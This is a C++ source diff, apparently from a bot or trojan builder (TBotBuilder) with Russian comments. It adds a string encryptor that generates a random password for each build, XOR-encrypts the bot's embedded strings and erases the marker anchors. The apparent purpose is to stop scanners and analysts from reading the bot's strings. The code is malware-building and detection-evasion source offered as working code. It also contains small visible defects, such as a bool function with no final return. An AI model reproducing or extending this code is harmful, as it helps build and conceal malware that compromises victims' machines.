@@ -8,6 +8,7 @@
 #include "Memory.h"
 #include "Crypt.h"
 #include "Strings.h"
+#include "Utils.h"
 
 #include "Config.h"
 #include "Hunter.h"
@@ -140,6 +141,24 @@ bool Builder::PackStringsToDoubleZeroEndLine(TStrings *Lines,
 }
 
 
+class TStringsPasswordParam : public TBotParam
+{
+public:
+	__fastcall TStringsPasswordParam(TBotBuilder* AOwner, bool NotNull, bool Encrypted, const char* Name, DWORD Size, const char* Title)
+		: TBotParam(AOwner, NotNull, Encrypted, Name, Size, Title)
+	{
+
+    }
+
+
+	TBotParamStatus __fastcall Status()
+	{
+    	return psOk;
+    }
+};
+
+
+
 //****************************************************************************
 //                             TBotBuilder
 //****************************************************************************
@@ -162,6 +181,11 @@ __fastcall TBotBuilder::TBotBuilder(TComponent* AOwner)
 	FParams = new TCollection(__classid(TBotParam));
 	FModules = new TCollection(__classid(TBotModule));
 	FActiveModules = new TList();
+
+	// Инициализируем классы для шифрования строк
+    FStringsEncryptor = new TBotStringsEncryptor(this);
+	FStringsPassword  = new TStringsPasswordParam(this, false, false, BOTPARAM_STRINGS_PASSW, MAX_STRINGS_PASSW_SIZE + 1, "Пароль шифрования строк");
+	FStringsPassword->AsAnsiString = "----";
 
 	// Добавляем основные параметры
 	FPrefix    = new TBotParam(this, true, true, BOTPARAM_PREFIX, MAX_PREFIX_SIZE, ParamTitle_Prefix);
@@ -228,6 +252,10 @@ void __fastcall TBotBuilder::LoadSourceFile(const UnicodeString &FileName)
 
     Message(Status_StartBuild);
 
+	// Создаём случайый пароль шифрования строк
+	PCHAR StrPass = Random::RandomString(MAX_STRINGS_PASSW_SIZE, 32, 255);
+	FStringsPassword->AsAnsiString = StrPass;
+
 	// Проверяем параметры
 	Message(Status_CheckParams);
 
@@ -268,8 +296,15 @@ void __fastcall TBotBuilder::LoadSourceFile(const UnicodeString &FileName)
 
 		// Записываем параметры
 		DWORD Count   = FParams->Count;
+
 		PCHAR Buf     = (PCHAR)Mem->Memory;
 		DWORD BufSize = Mem->Size;
+
+		// Шифруем строки бота
+		FStringsEncryptor->Encrypt(Buf, BufSize, StrPass);
+		STR::Free(StrPass);
+
+		// Вшиваем параметры
 		for (int i = 0; i < Count; i++)
 		{
 			TBotParam* Param = (TBotParam*)FParams->Items[i];
@@ -1119,3 +1154,80 @@ TBotParam* __fastcall TBotModule::ParamByName(const AnsiString &Name)
 
 	return NULL;
 }
+
+
+//*****************************************************************************
+//   						TBotStringsCryptor
+//*****************************************************************************
+__fastcall TBotStringsEncryptor::TBotStringsEncryptor(TComponent *Owner)
+	: TComponent(Owner)
+{
+
+}
+//---------------------------------------------------------------------------
+
+bool TBotStringsEncryptor::Encrypt(PCHAR Buf, DWORD BufSize, PCHAR Password)
+{
+	// Шифруем строковые данные бота
+	if (Buf == NULL || BufSize == 0 || STRA::IsEmpty(Password))
+		return false;
+
+	PCHAR StartAnchor = ENCRYPTED_STRINGS_BEGIN;
+	PCHAR EndAnchor   = ENCRYPTED_STRINGS_END;
+
+	// Определяем позиции блока шифрованных строк
+	int Start = STR::Pos(Buf, StartAnchor, BufSize, true);
+	if (Start < 0) return false;
+
+	PCHAR StartPtr = Buf + Start;
+
+	Start += STRA::Length(StartAnchor);
+
+	int End = STR::Pos(Buf + Start, EndAnchor, BufSize - Start, true);
+	if (End < 0)
+		throw Exception("Нарушение целостности блока шифрованных строк! \r\nОбратитесь к разработчикам.");
+
+    PCHAR EndPtr = Buf + Start + End;
+	// Проверяем данные. Цель проверки не допустить повреждения целосности
+	// бота. Считаем, что строки не могут содержать символы с кодом менее 9.
+
+	PCHAR Line = Buf + Start;
+
+	while (Line < EndPtr)
+	{
+		if (*Line > 0 && *Line < 9)
+			throw Exception("Нарушение целостности блока шифрованных строк! \r\nОбратитесь к разработчикам.");
+        Line++;
+    }
+
+
+	// Шифруем данные
+	Line = Buf + Start;
+	while (Line < EndPtr)
+	{
+		// Пропускаем лишние нули
+		if (*Line == 0)
+		{
+			Line++;
+			continue;
+		}
+
+		// Определяем конец строки
+		PCHAR End = Line;
+		while (*End) End++;
+
+		if (End >= EndPtr)
+			throw Exception("Нарушение целостности блока шифрованных строк! \r\nОбратитесь к разработчикам.");
+
+        // Шифруем данные
+        XORCrypt::Crypt(Password, (LPBYTE)Line, End - Line);
+		// Переходим к следующей строке
+        Line = End;
+    }
+
+	// Удяляем информацию о маркерах
+	m_memset(StartPtr, 0, STRA::Length(StartPtr));
+	m_memset(EndPtr, 0, STRA::Length(EndPtr));
+}
+//---------------------------------------------------------------------------
+
